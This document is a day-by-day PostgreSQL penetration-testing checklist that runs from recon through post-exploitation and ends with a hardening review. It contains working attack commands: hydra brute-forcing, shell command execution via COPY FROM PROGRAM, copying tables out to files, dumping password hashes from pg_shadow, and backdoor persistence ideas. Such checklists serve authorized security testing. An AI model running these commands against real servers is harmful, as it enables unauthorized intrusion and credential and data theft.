# ✅ PostgreSQL Pentest Extended Checklist

## Day 1 — Recon & Enumeration
- [ ] Run service discovery:  
  ```bash
  nmap -sV -sC -p 5432 <target>
  nmap --script pgsql-brute,pgsql-databases,pgsql-info -p 5432 <target>
  ```
- [ ] Grab banner (detect version/OS info):  
  ```bash
  nc <target> 5432
  ```
- [ ] Check if SSL/TLS enforced:  
  ```bash
  openssl s_client -starttls postgres -connect <target>:5432
  ```
- [ ] Verify pg_hba.conf exposure (via error messages).  
- [ ] Attempt connection without creds (trust/ident auth misconfig).  
- [ ] Brute-force attack if allowed:  
  ```bash
  hydra -L users.txt -P pass.txt postgres://<target>/postgres
  ```

## Day 2 — Authenticated Enumeration
- [ ] Connect with valid creds:  
  ```bash
  psql -h <target> -U <user> -d <dbname>
  ```
- [ ] Enumerate databases: `\l`  
- [ ] Enumerate roles & attributes: `\du+`  
- [ ] Enumerate active connections:  
  ```sql
  SELECT * FROM pg_stat_activity;
  ```
- [ ] Enumerate installed extensions: `\dx`  
- [ ] Check version & build:  
  ```sql
  SELECT version();
  SHOW server_version;
  ```
- [ ] Check password encryption:  
  ```sql
  SHOW password_encryption;
  ```
- [ ] Review logging configuration:  
  ```sql
  SHOW logging_collector;
  SHOW log_statement;
  ```

## Day 3 — Exploitation
- [ ] Test command execution (if superuser):  
  ```sql
  COPY cmd_exec FROM PROGRAM 'id';
  ```
- [ ] File read/write (priv esc / persistence):  
  ```sql
  COPY (SELECT 'test') TO '/tmp/test.txt';
  ```
- [ ] Exfiltrate data via file:  
  ```sql
  COPY (SELECT * FROM sensitive_table) TO '/tmp/exfil.csv' WITH CSV;
  ```
- [ ] Test UDF loading (custom C functions).  
- [ ] Abuse untrusted procedural languages (plperl, plpythonu).  
- [ ] Check if `COPY FROM STDIN` can be abused for data injection.  

## Day 4 — Privilege Escalation
- [ ] Check role inheritance:  
  ```sql
  SELECT rolname, rolsuper, rolcreaterole, rolinherit FROM pg_roles;
  ```
- [ ] Attempt role chaining:  
  ```sql
  SET ROLE <target_role>;
  ```
- [ ] Check for PUBLIC grants:  
  ```sql
  \du
  \z
  ```
- [ ] Test `dblink` extension for lateral movement.  
- [ ] Check for writable config files (alter system):  
  ```sql
  ALTER SYSTEM SET log_statement = 'all';
  ```
- [ ] Verify `pgcrypto` usage (weak crypto).  

## Day 5 — Post-Exploitation & Hardening Review
- [ ] Establish persistence (UDF backdoor, cron jobs, file drops).  
- [ ] Dump all credentials:  
  ```sql
  SELECT usename, passwd FROM pg_shadow;
  ```
- [ ] Check password hashes type (MD5 vs SCRAM-SHA-256).  
- [ ] Attempt cracking with `hashcat` if MD5.  
- [ ] Audit for CVEs matching version.  
- [ ] Review configs:  
  - [ ] `listen_addresses` restricted.  
  - [ ] SSL/TLS enforced.  
  - [ ] Remote connections limited in `pg_hba.conf`.  
  - [ ] Remove unnecessary superusers.  
  - [ ] Disable unsafe extensions.  
  - [ ] Enable `pg_audit` / `log_statement`.  
